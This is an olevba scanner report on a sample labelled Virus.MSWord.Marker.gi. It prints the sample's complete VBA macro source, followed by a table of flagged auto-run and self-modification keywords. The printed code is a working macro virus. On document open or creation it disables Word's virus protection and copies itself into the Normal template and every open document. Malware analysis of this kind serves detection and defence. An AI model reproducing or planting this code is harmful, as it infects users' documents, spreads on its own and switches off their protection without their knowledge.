olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.gi-ea88644104c2e3bf34521121f1cce5f1e94b3118
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.gi-ea88644104c2e3bf34521121f1cce5f1e94b3118 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'MARKER_RV_001'

Application.Options.VirusProtection = False

If Me <> NormalTemplate Then
 Infect NormalTemplate, ActiveDocument
 NormalTemplate.Save
End If

For i = 1 To Application.Documents.Count
   Infect Application.Documents.Item(i), NormalTemplate
Next
   
End Sub
    
Private Sub Infect(a, b As Object)
 mstr = a.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1)
 vers = Val(Mid(b.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1), 12, 3))
 
 If (Mid(mstr, 2, 9) <> "MARKER_RV" Or Val(Mid(mstr, 12, 3)) < vers) Then
    a.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, a.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
 If a.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    a.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, b.VBProject.VBComponents.Item(1).CodeModule.Lines(1, b.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
    End If
End Sub

Private Sub Document_New()
    Document_Open
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
